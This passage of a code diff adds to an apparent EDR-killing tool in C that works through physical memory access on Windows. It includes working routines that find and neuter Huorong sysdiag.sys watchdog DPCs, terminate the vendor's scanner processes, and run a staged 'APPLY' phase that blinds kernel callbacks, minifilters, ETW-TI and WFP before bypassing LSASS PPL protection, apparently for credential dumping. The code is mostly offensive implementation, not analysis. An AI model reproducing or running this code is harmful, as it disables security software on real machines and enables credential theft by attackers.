+ * DeferredRoutine VA falls inside sysdiag's loaded image range, then redirect
+ * the routine pointer to a harmless 'C3' (RET) stub in ntoskrnl.
+ * KDPC/KTIMER are non-paged pool data — not HVCI-protected code pages.
+ * After redirect, the timer still fires but the DPC immediately returns. */
+static int kill_sysdiag_watchdog(void)
+{
+    /* Locate sysdiag.sys VA range from module list */
+    uint64_t sd_base=0, sd_end=0;
+    for(int i=1;i<g_nmods;i++){
+        if(_stricmp(g_mods[i].name,"sysdiag.sys")==0){
+            sd_base=g_mods[i].base;
+            sd_end =g_mods[i].base+g_mods[i].size;
+            break;
+        }
+    }
+    if(!sd_base){ printf("  sysdiag.sys not in module list\n"); return 0; }
+    printf("  sysdiag VA range: 0x%llX - 0x%llX\n",
+           (unsigned long long)sd_base,(unsigned long long)sd_end);
+
+    /* Find a valid 'C3' (RET) byte in ntoskrnl's mapped code to use as harmless stub.
+     * We skip the PE header (first 0x1000) and look in executable code. */
+    uint64_t ret_va = 0;
+    if(g_nmods>0 && g_kernel_cr3){
+        uint64_t nt_pa = va_to_pa(g_mods[0].base);
+        if(nt_pa){
+            uint8_t hdr[0x2000];
+            if(phys_read(nt_pa+0x1000, hdr, sizeof(hdr))){
+                for(int j=4; j<(int)sizeof(hdr)-1; j++){
+                    /* 0xC3 = RET; also accept 0x48 0xC7 0xC0 ... 0xC3 (xor rax/ret pattern).
+                     * Just need any standalone C3 that's safe to call. */
+                    if(hdr[j]==0xC3 && hdr[j-1]!=0xE8 && hdr[j-1]!=0xFF){
+                        ret_va = g_mods[0].base + 0x1000 + j;
+                        break;
+                    }
+                }
+            }
+        }
+    }
+    if(!ret_va){ printf("  [!] no RET stub found in ntoskrnl\n"); return 0; }
+    printf("  RET stub VA=0x%llX\n",(unsigned long long)ret_va);
+
+    /* Scan physical RAM for KDPC/ThreadedDPC objects pointing into sysdiag */
+    int killed=0;
+    static uint8_t wd_scan[0x40000]; /* 256 KB work buffer */
+    for(int ri=0; ri<g_nranges; ri++){
+        uint64_t rend=g_ranges[ri].base+g_ranges[ri].size;
+        for(uint64_t cpa=g_ranges[ri].base; cpa<rend; cpa+=sizeof(wd_scan)){
+            uint64_t csz=rend-cpa;
+            if(csz>sizeof(wd_scan)) csz=sizeof(wd_scan);
+            if(!phys_read(cpa,wd_scan,(uint32_t)csz)) continue;
+            /* KDPC layout (Windows 10/11 x64):
+             *   +0x00 Type       UCHAR  (0x13=DpcObject, 0x1A=ThreadedDpcObject)
+             *   +0x01 Importance UCHAR  (0=Low,1=Medium,2=High)
+             *   +0x02 Volatile   UINT16 (processor number)
+             *   +0x08 DpcListEntry SINGLE_LIST_ENTRY
+             *   +0x10 ProcessorHistory UINT64
+             *   +0x18 DeferredRoutine  PTR64  ← redirect this
+             *   +0x20 DeferredContext  PTR64
+             *   size = 0x40
+             * Stride 8: KDPCs are 8-byte aligned in pool. */
+            for(uint64_t off=0; off+0x40<=csz; off+=8){
+                uint8_t typ=wd_scan[off];
+                if(typ!=0x13 && typ!=0x1A) continue;
+                uint8_t imp=wd_scan[off+1];
+                if(imp>2) continue; /* invalid importance */
+                uint64_t fn=*(uint64_t*)(wd_scan+off+0x18);
+                /* Must be a canonical kernel address in sysdiag's range */
+                if((fn>>48)!=0xFFFF) continue;
+                if(fn<sd_base||fn>=sd_end) continue;
+                uint64_t dpc_pa=cpa+off;
+                printf("    KDPC PA=0x%llX  type=0x%02X  imp=%u  routine=0x%llX (sysdiag+0x%llX)\n",
+                    (unsigned long long)dpc_pa, typ, imp,
+                    (unsigned long long)fn, (unsigned long long)(fn-sd_base));
+                if(phys_write(dpc_pa+0x18, &ret_va, 8)){
+                    printf("    → DeferredRoutine redirected to RET stub\n");
+                    killed++;
+                }
+            }
+        }
+    }
+    printf("  %d sysdiag KDPC(s) neutered\n", killed);
+    return killed;
 }
 
 /* ══════════════════════════════════════════════════════════════════════
@@ -1990,11 +2383,37 @@ static void it_dump(HANDLE hlsass, DWORD lsass_pid)
     }
 }
 
+/* Kill a named process if running. Used to stop Huorong user-mode scanner
+ * (HipsDaemon.exe) so sysdiag.sys kernel driver can't get scan results.
+ * Requires sysdiag OB callbacks to be zeroed first (otherwise ACCESS_DENIED). */
+static int kill_process_by_name(const char *name)
+{
+    HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
+    if(snap==INVALID_HANDLE_VALUE) return 0;
+    PROCESSENTRY32 pe={sizeof pe}; int killed=0;
+    if(Process32First(snap,&pe)) do {
+        if(_stricmp(pe.szExeFile,name)==0){
+            HANDLE h=OpenProcess(PROCESS_TERMINATE,FALSE,pe.th32ProcessID);
+            if(h){if(TerminateProcess(h,1))killed++;CloseHandle(h);}
+        }
+    } while(Process32Next(snap,&pe));
+    CloseHandle(snap);
+    return killed;
+}
+
 /* T7: EICAR — write official AV test string, check WdFilter doesn't delete it.
  * String is split across two literals so this source file doesn't trigger AV. */
 static void it_eicar(void)
 {
     printf("\n[T7] EICAR — write AV test string, check WdFilter doesn't delete it\n");
+    /* Kill Huorong user-mode scanner so sysdiag kernel driver has no one to ask.
+     * sysdiag does not hardcode EICAR → requires user-mode (HipsDaemon.exe) for detection.
+     * OB callbacks for sysdiag should be zeroed at [3/8] so TerminateProcess works. */
+    int kd=kill_process_by_name("HipsDaemon.exe");
+    int ks=kill_process_by_name("SysDiag.exe");
+    if(kd||ks) printf("    Killed: HipsDaemon=%d SysDiag=%d — scanner offline\n",kd,ks);
+    else        printf("    [!] Huorong scanner processes not found or kill failed (OB still active?)\n");
+    Sleep(500); /* let scanner fully stop */
     char tmp[MAX_PATH]; GetTempPathA(sizeof tmp, tmp);
     char path[MAX_PATH];
     snprintf(path, sizeof path, "%s\\eicar_%lu.com", tmp, (unsigned long)GetCurrentProcessId());
@@ -2133,12 +2552,32 @@ int main(void)
     load_module_map();
     printf("[+] Kernel modules: %d\n",g_nmods);
 
-    /* Find kernel CR3 for VA→PA translation (needed for minifilter list unlink) */
-    g_kernel_cr3=find_kernel_cr3();
-    if(g_kernel_cr3)
-        printf("[+] Kernel CR3 (PML4 base): 0x%016llX\n\n",(unsigned long long)g_kernel_cr3);
-    else
-        printf("[!] Kernel CR3 not found — minifilter will use code-patch fallback\n\n");
+    /* Find kernel CR3.  Two methods:
+     * 1. Self-referencing PML4/PML5 scan (fast but limited to first 64MB)
+     * 2. System EPROCESS DirectoryTableBase scan (reliable, full RAM scan)
+     * Method 2 is authoritative — use it if method 1 fails or paging detection fails. */
+    {
+        uint64_t nt_va0 = g_nmods>0 ? g_mods[0].base : 0;
+        g_kernel_cr3 = find_kernel_cr3(nt_va0);
+        if(g_kernel_cr3){
+            printf("[+] Kernel CR3 (self-ref scan): 0x%016llX\n",(unsigned long long)g_kernel_cr3);
+            detect_paging_mode(nt_va0);
+        }
+        /* If self-ref scan failed OR paging detection inconclusive → use EPROCESS method */
+        if(!g_kernel_cr3 || (!g_paging_5l && !va_to_pa(nt_va0))){
+            printf("[*] CR3 self-ref scan unreliable — scanning System EPROCESS...\n");
+            uint64_t cr3_ep = find_cr3_from_system_eprocess();
+            if(cr3_ep){
+                g_kernel_cr3 = cr3_ep;
+                detect_paging_mode(nt_va0);
+            }
+        }
+        if(g_kernel_cr3)
+            printf("[+] Kernel CR3 active: 0x%016llX  paging=%s\n\n",
+                   (unsigned long long)g_kernel_cr3, g_paging_5l?"5-level(LA57)":"4-level(LA48)");
+        else
+            printf("[!] Kernel CR3 not found — minifilter will use code-patch fallback\n\n");
+    }
 
     /* ntoskrnl */
     MOD_LIST *ml=get_module_list();
@@ -2169,8 +2608,13 @@ int main(void)
     if(!nt_pa){printf("[-] ntoskrnl PA not found\n");free(pe);CloseHandle(g_dev);return 1;}
     printf("[+] ntoskrnl PA=0x%016llX\n\n",(unsigned long long)nt_pa);
 
-    /* Resolve watchdog target VAs */
+    /* Resolve watchdog target VAs + find FLT stub for sysdiag A.6 */
     wk_resolve_targets(pe,pe_sz,nt_va);
+    g_flt_stub_va = flt_find_stub_va(pe,pe_sz,nt_va);
+    if(g_flt_stub_va)
+        printf("  [flt_stub] xor eax,eax;ret @ VA=0x%llX\n",(unsigned long long)g_flt_stub_va);
+    else
+        printf("  [flt_stub] WARNING: stub not found — sysdiag A.6 will be skipped\n");
 
     SetConsoleCtrlHandler(ctrl_handler,TRUE);
 
@@ -2281,7 +2725,7 @@ int main(void)
      printf("    [1] Watchdog Kill    — %d call site(s)\n",g_wk_n);
      printf("    [2] Ps* Notify       — %d live entries\n",ps_live);}
     {int e=0;for(int i=0;i<g_ob_n;i++)      if(is_edr_target(g_ob[i].drv))         e++;printf("    [3] ObCallbacks      — %d EDR\n",e);}
-    {int e=0;for(int i=0;i<g_flt_n_grp;i++) if(is_edr_target(g_flt_grp[i].driver)) e++;printf("    [4] Minifilter       — %d EDR groups\n",e);}
+    {int e=0;for(int i=0;i<g_flt_n_grp;i++) if(is_edr_target(g_flt_grp[i].driver)||_stricmp(g_flt_grp[i].driver,"sysdiag.sys")==0) e++;printf("    [4] Minifilter       — %d EDR groups (incl. sysdiag)\n",e);}
     printf("    [5] ETW-TI           — Method A (exports) + Method B (GUID)\n");
     {int e=0;for(int i=0;i<g_cm_n;i++)      if(is_edr_target(g_cm[i].drv))         e++;printf("    [6] CmCallback       — %d EDR\n",e);}
     {int e=0;for(int i=0;i<g_wfp_n;i++)     if(is_edr_target(g_wfp[i].drv))        e++;printf("    [7] WFP Callouts     — %d EDR\n",e);}
@@ -2296,6 +2740,16 @@ int main(void)
     printf("\n══════════════════════════════════════════════════════════\n");
     printf(" PHASE 3: APPLY\n");
     printf("══════════════════════════════════════════════════════════\n\n");
+
+    printf("[0/8] Sysdiag watchdog disable (KDPC redirect)...\n");
+    if(huorong_is_active()){
+        int wd=kill_sysdiag_watchdog();
+        if(wd){ g_sysdiag_wd_killed=1; printf("    OK — %d DPC(s) neutered, sysdiag blind\n\n",wd); }
+        else   printf("    [!] no KDPC found — sysdiag watchdog still active\n"
+                      "    (PPL write + sysdiag FLT will be skipped)\n\n");
+    } else {
+        printf("    (Huorong not detected — step skipped)\n\n");
+    }
 
     printf("[1/8] Watchdog Kill...\n");
     {int ok=wk_apply(); printf("    Patched: %d/%d call sites\n\n",ok,g_wk_n);}
@@ -2347,9 +2801,14 @@ int main(void)
 
     printf("\n[8/8] PPL bypass (LSASS.Protection)...\n");
     {
-        int ok=ppl_apply();
-        if(!ok) printf("    FAILED — check diagnostic above\n");
-        else if(!g_lsass_prot_api) printf("    (NtQIP=0x00 — not PPL-protected, no write needed)\n");
+        if(huorong_is_active() && !g_sysdiag_wd_killed){
+            printf("    [Huorong+watchdog active] PPL write skipped\n");
+            printf("    → Re-run after [0/8] KDPC kill succeeds, or use lsass_dump.exe\n");
+        } else {
+            int ok=ppl_apply();
+            if(!ok) printf("    FAILED\n");
+            else if(!g_lsass_prot_api) printf("    (NtQIP=0x00 — not PPL-protected, no write needed)\n");
+        }
     }
 
     printf("\n[*] Cache eviction (multi-CCD)... "); fflush(stdout);
